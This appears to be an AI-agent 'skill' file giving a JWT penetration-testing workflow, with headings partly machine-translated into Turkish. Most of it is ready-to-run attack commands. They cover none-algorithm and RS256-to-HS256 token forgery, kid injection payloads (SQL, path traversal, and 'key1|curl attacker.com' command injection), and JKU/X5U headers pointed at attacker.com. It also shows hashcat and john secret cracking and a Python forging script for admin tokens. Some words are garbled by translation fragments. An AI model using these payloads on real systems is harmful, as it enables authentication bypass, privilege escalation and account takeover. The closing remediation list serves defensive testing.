---
name: testing-for-json-web-token-vulnerabilities
description: Test JWT implementations for critical vulnerabilities including algorithm confusion, none algorithm bypass, kid parameter injection, and weak secret exploitation to achieve authentication bypass
  and privilege escalation.
tags:
- authentication-bypass
- kid-injection
- token-forgery
- algorithm-confusion
- fetih
- web-application-security
- jwt
- cybersecurity
- jku-attack
- siber-güvenlik
- json-web-token
triggers:
- CSRF
- SQL injection
- XSS
- api
- authentication
- certificate
- endpoint
- exploit
- hash
- http
- json
- password
category: web-application-security
source_subdomain: web-application-security
nist_csf:
- PR.PS-01
- ID.RA-01
- PR.DS-10
- DE.CM-01
---

# Testing for Json Web Token Vulnerabilities


## Ne Zaman Kullanılır
- testing yaparken applications using JWT for authentication and session management
- During API security assessments where JWTs are used for authorization
- evaluating yaparken: OAuth 2.0 or OpenID Connect implementations using JWT
- During penetration testing of single sign-on (SSO) systems
- auditing yaparken JWT library configurations for known vulnerabilities

## Ön Gereksinimler
- jwt_tool (Python JWT exploitation toolkit)
- Burp Suite with JWT Editor extension
- jwt.io for decoding and Denetle:ing JWT structure
- Understanding of JWT structure (header.payload.signature) and algorithms (HS256, RS256)
- hashcat or john for brute-forcing weak JWT secrets
- Python PyJWT library for custom JWT forging scripts
- Erişim: application using JWT-based authentication


> **Legal Notice:** bu skill is for authorized security testing and educational purposes only. Unauthorized use against systems you do not own or have written permission to test is illegal and may violate computer fraud laws.

## İş Akışı

### Adım 1 — Decode and Analyze JWT Structure
```bash
pip install pyjwt
git clone https://github.com/ticarpi/jwt_tool.git

python3 jwt_tool.py <JWT_TOKEN>

echo "<header_base64>" | base64 -d
echo "<payload_base64>" | base64 -d


```

### Adım 2 — Test "None" Algorithm Bypass
```bash
python3 jwt_tool.py <JWT_TOKEN> -X a


curl -H "Authorization: Bearer <FORGED_TOKEN>" http://target.com/api/admin

python3 jwt_tool.py <JWT_TOKEN> -X a -I -pc role -pv admin
```

### Adım 3 — Test Algorithm Confusion (RS256 to HS256)
```bash

curl http://target.com/.well-known/jwks.json

openssl s_client -connect target.com:443 </dev/null 2>/dev/null | \
  openssl x509 -pubkey -noout > public_key.pem

python3 jwt_tool.py <JWT_TOKEN> -X k -pk public_key.pem

python3 -c "
import jwt
with open('public_key.pem', 'r') as f:
    public_key = f.read()
payload = {'sub': 'admin', 'role': 'admin', 'iat': 1700000000, 'exp': 1900000000}
token = jwt.encode(payload, public_key, algorithm='HS256')
print(token)
"
```

### Adım 4 — Test Key ID (kid) Parameter Injection
```bash
python3 jwt_tool.py <JWT_TOKEN> -I -hc kid -hv "' UNION SELECT 'secret-key' FROM dual--" \
  -S hs256 -p "secret-key"

python3 jwt_tool.py <JWT_TOKEN> -I -hc kid -hv "../../dev/null" \
  -S hs256 -p ""

python3 jwt_tool.py <JWT_TOKEN> -I -hc kid -hv "/dev/null" -S hs256 -p ""

python3 jwt_tool.py <JWT_TOKEN> -I -hc kid -hv "http://attacker.com/key"

python3 jwt_tool.py <JWT_TOKEN> -I -hc kid -hv "key1|curl attacker.com"
```

### Adım 5 — Test JKU/X5U Header Injection
```bash
python3 jwt_tool.py <JWT_TOKEN> -X s


python3 jwt_tool.py <JWT_TOKEN> -X s -ju "http://attacker.com/.well-known/jwks.json"

python3 jwt_tool.py <JWT_TOKEN> -I -hc x5u -hv "http://attacker.com/cert.pem"

python3 jwt_tool.py <JWT_TOKEN> -X i
```

### Adım 6 — Brute-Force Weak JWT Secrets
```bash
hashcat -a 0 -m 16500 <JWT_TOKEN> /usr/share/wordlists/rockyou.txt

python3 jwt_tool.py <JWT_TOKEN> -C -d /usr/share/wordlists/rockyou.txt

echo "<JWT_TOKEN>" > jwt.txt
john jwt.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256


python3 jwt_tool.py <JWT_TOKEN> -S hs256 -p "discovered_secret" \
  -I -pc role -pv admin -pc sub -pv "admin@target.com"
```

## Key Concepts

| Concept | Description |
|---------|-------------|
| Algorithm Confusion | Switching from asymmetric (RS256) to symmetric (HS256) using public key as secret |
| None Algorithm | Setting alg to "none" to create unsigned tokens accepted by misconfigured servers |
| Kid Injection | Exploiting the Key ID header parameter for SQLi, path traversal, or SSRF |
| JKU/X5U Injection | Pointing key source URLs to attacker-controlled servers for key substitution |
| Weak Secret | HMAC secrets that can be brute-forced using dictionary attacks |
| Claim Tampering | Modifying payload claims (role, sub, admin) after bypassing signature verification |
| Token Replay | Reusing valid JWTs after the intended session should have expired |

## Tools & Systems

| Tool | Purpose |
|------|---------|
| jwt_tool | Comprehensive JWT testing and exploitation toolkit |
| JWT Editor (Burp) | Burp Suite extension for JWT manipulation and attack automation |
| hashcat | GPU-accelerated JWT secret brute-forcing (mode 16500) |
| john the ripper | CPU-based JWT secret cracking |
| jwt.io | Online JWT decoder and debugger for Denetle:ion |
| PyJWT | Python library for programmatic JWT creation and verification |

## Common Scenarios

1. **None Algorithm Bypass** — Change JWT algorithm to "none", remove signature, and forge admin tokens on servers that accept unsigned JWTs
2. **Algorithm Confusion RCE** — Switch RS256 to HS256 using leaked public key to forge arbitrary tokens for administrative access
3. **Kid SQL Injection** — Inject SQL payload in kid parameter to Şunu çıkar: signing key from the database
4. **Weak Secret Cracking** — Brute-force HMAC-SHA256 secrets using hashcat to forge arbitrary JWTs for any user
5. **JKU Server Spoofing** — Point JKU header to attacker-controlled JWKS endpoint to sign tokens with attacker's private key

## Output Format

```
## JWT Security Assessment Report
- **Target**: http://target.com
- **JWT Algorithm**: RS256 (claimed)
- **JWKS Endpoint**: http://target.com/.well-known/jwks.json

### Bul:ings
| # | Vulnerability | Technique | Impact | Severity |
|---|--------------|-----------|--------|----------|
| 1 | None algorithm accepted | alg: "none" | Auth bypass | Critical |
| 2 | Algorithm confusion | RS256 -> HS256 | Token forgery | Critical |
| 3 | Weak HMAC secret | Brute-force: "secret123" | Full token forgery | Critical |
| 4 | Kid path traversal | kid: "../../dev/null" | Sign with empty key | High |

### İyileştirme
- Enforce algorithm whitelist in JWT verification (reject "none")
- Use asymmetric algorithms (RS256/ES256) with proper key management
- Implement strong, random secrets for HMAC algorithms (256+ bits)
- Validate kid parameter against a strict allowlist
- Ignore jku/x5u headers or validate against known endpoints
- Set appropriate token expiration (exp) and implement token revocation
```
